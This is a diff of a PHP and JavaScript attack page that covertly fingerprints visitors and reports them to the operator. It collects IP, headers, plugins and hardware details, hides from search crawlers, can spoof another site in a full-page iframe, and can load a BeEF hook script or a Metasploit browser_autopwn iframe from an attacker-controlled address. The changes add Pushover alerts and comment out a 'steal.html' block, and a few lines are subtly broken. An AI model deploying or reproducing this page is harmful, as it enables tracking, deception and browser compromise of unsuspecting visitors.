@@ -3,47 +3,48 @@
 <head>
 
 <?php
-
- /* --------------------[settings]-------------------- */ 
-
+ /* --------------------[settings]-------------------- */
   // 0 - Off
   // 1 - On
-
   ini_set('error_log', NULL);
   ini_set('log_errors', 0);
   ini_set('max_execution_time', 0);
-  ini_set('error_reporting', 0);
+  ini_set('error_reporting', 1);
   set_time_limit(0);
-
   define('hash', md5(rand(1, 1337).$_SERVER['REMOTE_ADDR'].time()));
   define('time', date("m.d.y H:i:s"));
 
+  // -------------- Logging
   // Output
   define('output', 'output.html');
 
+  // -------------- Notifications
   // Email notification
   define('email_notify', 0);
-  define('notify_address', 'usr@box.com');
+  define('notify_address', '');
+  define('pushover', 0);
+  define('pushover_key', '');
+  define('pushover_app_token', '');
 
+  // -------------- Webpage settings
   // Redirect
-  define('redirect', 0); 
-  define('redirect_url', 'http://host/');
-
+  define('redirect', 0);
+  define('redirect_url', 'http://host');
   // Website spoofing
   define('use_spoofing', 0);
-  define('spoof_url', 'http://host/');
+  define('spoof_url', 'http://host');
 
+  // -------------- Attack settings
   // Beef js hook (or custom js)
   define('use_beef', 0);
   define('hook_url', 'http://192.168.0.10:31337/hook.js');
-
   // Metasploit browser_autopwn http server (or custom iframe)
   define('use_autopwn', 0);
   define('autopwn_url', 'http://192.168.0.10:8080/woot');
-
 /* --------------------------------------------------- */
 
 
+/* ----------------------    Filter user agents    ----------------------------- */
 if(!empty($_SERVER['HTTP_USER_AGENT'])) {
     $userAgents = array("Google", "Slurp", "MSNBot", "ia_archiver", "Yandex", "Rambler");
     if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
@@ -52,11 +53,18 @@ if(!empty($_SERVER['HTTP_USER_AGENT'])) {
     }
 }
 
+
+/* ----------------------    This updates output.html when this file later posts to this location    ----------------------------- */
 if(isset($_POST['data']) && file_exists(output) && is_writable(output)) {
   $fp = fopen(output, 'a');
   fwrite($fp, $_POST['data']);
   fclose($fp);
 }
+
+
+/* -----------------------
+No idea what this is for so i'm commenting it out
+Just seems to make a page but no content other than the style.
 
 if(file_exists(output) && filesize(output) < 5) {
   $fp    = fopen('steal.html', 'a');
@@ -67,65 +75,79 @@ if(file_exists(output) && filesize(output) < 5) {
            '</head><body>';
   fwrite($fp, $style);
   fclose($fp);
-} 
+}
+---------------------------- */
 
+/* --------------------------------------------------- */
 function notify() {
-
  $headers  = "MIME-Version: 1.0\n" ;
+ $headers  = "From: name@mx.com\n";
  $headers .= "Content-Type: text/html; charset=\"iso-8859-1\"\n";
  $headers .= "X-Priority: 1 (Highest)\n";
  $headers .= "X-MSMail-Priority: High\n";
  $headers .= "Importance: High\n";
-
-  mail(notify_address, 'Sup?', 'IP logged - '.$_SERVER['REMOTE_ADDR'], $headers);
-
+  mail(notify_address, 'Got something for ya...', 'IP logged - '.$_SERVER['REMOTE_ADDR']
+.'   Trying to post output to http://' . $_SERVER['HTTP_HOST'] .' plus this URI'. $_SERVER['REQUEST_URI'], $headers);
 }
 
-function nojs() {  
 
+/* --------------------------------------------------- */
+function pushover() {
+  curl_setopt_array($ch = curl_init(), array(
+    CURLOPT_URL => "https://api.pushover.net/1/messages.json",
+    CURLOPT_POSTFIELDS => array(
+      "token" => $pushover_app_token,
+      "user" => $pushover_key,
+      "message" => "Got a hook.",
+    ),
+    CURLOPT_SAFE_UPLOAD => true,
+  ));
+  curl_exec($ch);
+  curl_close($ch);
+}
+
+
+/* --------------------------------------------------- */
+function nojs() {
 $ip   = $_SERVER['REMOTE_ADDR'];
 $host = gethostbyaddr($ip);
-
 if(!isset($_SERVER['HTTP_REFERER'])) { $ref = 'None'; } else { $ref = htmlspecialchars($_SERVER['HTTP_REFERER']); }
 if(function_exists('getallheaders')) {
 foreach(getallheaders() as $header => $info) {
   $req .= htmlspecialchars($header).' - '.htmlspecialchars($info).'<br />';
-} 
+}
 } else { $req = 'Undefined'; }
-
 $data = '<center><a href="#'.hash.'" onclick="show(\''.hash.'\');"><h4>'.$ip.'</h4></a></center>'.
-'<div id="'.hash.'" style="display:none;"><hr /><p>'.time.'</p><div class="text">'.
+'<div id="'.hash.'" style="display:block;"><hr /><p>'.time.'</p><div class="text">'.
 '<h3>Info</h3>'.
 '<br />IP - <a href="http://ipinfo.io/'.$ip.'">'.$ip.'</a>'.
 '<br />Host - '.$host.
 '<br />Referer - '.$ref.
 '<br />Javascript not enabled!'.
 '<br /><h3>Request headers</b></h3> '.$req;
-
 if(file_exists(output) && is_writable(output)) {
   $fp = fopen(output, 'a');
   fwrite($fp, $data.'</div><br /><hr /></div>');
   fclose($fp);
 }
-
 if(redirect == 1) {
   header('Location: '.redirect_url);
 }
-
 }
-
 if(isset($_GET['nojs'])) {
   nojs();
   exit;
 }
-
 ?>
+
+
 
 <script type="text/javascript">
 
+
 function configVar() {
   var config = {
-    host:"<?php echo 'http://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];?>",
+    host:"<?php echo 'http://' . $_SERVER['HTTP_HOST']. $_SERVER['REQUEST_URI'];?>",
     redirect:"<?php echo redirect; ?>",
     redirect_url:"<?php echo redirect_url; ?>",
     time:"<?php echo time; ?>"
@@ -133,16 +155,17 @@ function configVar() {
   return config;
 }
 
-function getUserData() {
 
+
+function getUserData() {
   if(window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection) { var rtcs = 'true'; }      else { var rtcs = 'false'; }
-    
+
  if (typeof(navigator.oscpu) != "undefined" && navigator.oscpu !== null) {
   var osff = " ("+navigator.oscpu+") ";
  } else {
-  var osff = "";   
+  var osff = "";
  }
-    
+
   var userData = {
     ip:"<?php echo htmlspecialchars($_SERVER['REMOTE_ADDR']); ?>",
     ref:"<?php if(!isset($_SERVER['HTTP_REFERER'])) { echo 'None'; } else { echo htmlspecialchars($_SERVER['HTTP_REFERER']); } ?>",
@@ -165,6 +188,8 @@ function getUserData() {
   return userData;
 }
 
+
+/* --------------------------------------------------- */
 function getBrowserPlugins() {
 var L = navigator.plugins.length;
 var plugs = new Array();
@@ -174,14 +199,15 @@ for(var i = 0; i < L; i++) {
 }
 return encodeURI("<br /><center><b>" + L.toString() + " Plugin(s) Detected</b><br><table border=1 width=\"80%\"><tr><th>Name</th><th>Filename</th><th>Description</th><th>Version</th></tr>" + plugs.join('') + "</table></center>");
 }
-    
+
+
+/* --------------------------------------------------- */
 function webgl_detect(return_context)
 {
     if (!!window.WebGLRenderingContext) {
         var canvas = document.createElement("canvas"),
              names = ["webgl", "experimental-webgl", "moz-webgl", "webkit-3d"],
            context = false;
-
         for(var i=0;i<4;i++) {
             try {
                 context = canvas.getContext(names[i]);
@@ -197,30 +223,30 @@ function webgl_detect(return_context)
     }
     return false;
 }
-    
+
+
+/* --------------------------------------------------- */
 function cores() {
- 
+
     if (typeof(navigator.hardwareConcurrency) != "undefined" && navigator.hardwareConcurrency !== null) {
         return "<b>CPU Cores:</b> "+navigator.hardwareConcurrency+"<br />";
     } else if (typeof(navigator.cpuClass) != "undefined" && navigator.cpuClass !== null) {
         return "<b>CPU Class:</b> "+navigator.cpuClass+"<br />";
     }
     else { return ''; }
-    
+
 }
-    
+
+/* --------------------------------------------------- */
 function getPlugins() {
   if (navigator.plugins) {
-
     var quickt = false;
     var flash  = false;
     var silverlight = false;
     var javax = navigator.javaEnabled();
     var webgl =  webgl_detect();
-
 if (navigator.plugins["QuickTime"] )
 { quickt = true; }
-
 try {
   var fo = new ActiveXObject('ShockwaveFlash.ShockwaveFlash');
   if (fo) {
@@ -233,7 +259,6 @@ try {
     flash = true;
   }
 }
-
 try
 {
     var slControl = new ActiveXObject('AgControl.AgControl');
@@ -246,7 +271,6 @@ if (navigator.plugins["Silverlight Plug-In"])
   silverlight = true;
     }
 }
-
 var data = new Object();
     data['quicktime']   = quickt;
     data['flash']       = flash;
@@ -254,11 +278,11 @@ var data = new Object();
     data['java']        = javax;
     data['webgl']       = webgl;
 return data;
-
-}
- 
 }
 
+}
+
+/* --------------------------------------------------- */
 function sendData(data) {
  var xhr  = new XMLHttpRequest();
  var divout = '<br /><hr /></div>';
@@ -270,24 +294,23 @@ function sendData(data) {
  var body = "data="+data+getBrowserPlugins()+divout;
  var aBody = new Uint8Array(body.length);
  for (var i = 0; i < aBody.length; i++)
-   aBody[i] = body.charCodeAt(i); 
+   aBody[i] = body.charCodeAt(i);
  xhr.send(new Blob([aBody]));
 }
-
 </script>
 </head>
+
+
 
 <body style="margin: 0; padding: 0; height: 100%; overflow: hidden;">
 
 <script type="text/javascript">
-
 var userData = getUserData();
 var date = new Date();
 var data = getPlugins();
 var config = configVar();
-
 var datax = encodeURI("<center><a href=\"#"+userData["hash"]+"\" onclick=\"show('"+userData["hash"]+"');\"><h4>"+userData["ip"]+"</h4></a></center>"+
-  "<div id=\""+userData['hash']+"\" style=\"display:none;\"><hr /><p>"+config["time"]+"</p><div class=\"text\">"+
+  "<div id=\""+userData['hash']+"\" style=\"display:block;\"><hr /><p>"+config["time"]+"</p><div class=\"text\">"+
   "<h3>Host</h3>"+
   "<b>IP:</b> <a href=\"http://ipinfo.io/"+userData["ip"]+"\">"+userData["ip"]+"</a><br />"+
   "<b>Hostname:</b> "+userData["host"]+"<br />"+
@@ -317,24 +340,30 @@ var datax = encodeURI("<center><a href=\"#"+userData["hash"]+"\" onclick=\"show(
   "<b>QuickTime:</b> "+data['quicktime']+"<br />"+
   "<b>WebGL:</b> "+data['webgl']+"<br />"+
   "<b>WebRTC:</b> "+userData['rtc']+"<br /></div>");
-
 sendData(datax);
-
 if(config["redirect"] == 1) {
     window.setTimeout(function(){
         window.location.href = config["redirect_url"];
     }, 1);
 }
 
+
+/* --------------------------------------------------- */
+function resizeIframe(obj) {
+    obj.style.height = obj.contentWindow.document.body.scrollHeight + 'px';
+}
 </script>
 
-<?php
 
-if(email_notify == 1) { notify(); }
+
+<?php
+if(email_notify == 1 && !isset($_POST['data'])) { notify(); } // This needed to be modified to prevent double notifications.
+if(pushover == 1 && !isset($_POST['data'])) { pushover(); }
 if(use_beef     == 1) { echo '<script src="'.hook_url.'"></script>'; }
 if(use_autopwn  == 1) { echo '<iframe src="'.autopwn_url.'"></iframe>'; }
-if(use_spoofing == 1) { echo '<iframe src="'.spoof_url.'" height="100%" width="100%" frameborder="0"></iframe>'; }
+if(use_spoofing == 1) { echo '<iframe src="'.spoof_url.'" frameborder="0" scrolling="no" onload="resizeIframe(this)></iframe>'; }
 
+unset($_POST['data'])
 ?>
 
 <noscript>
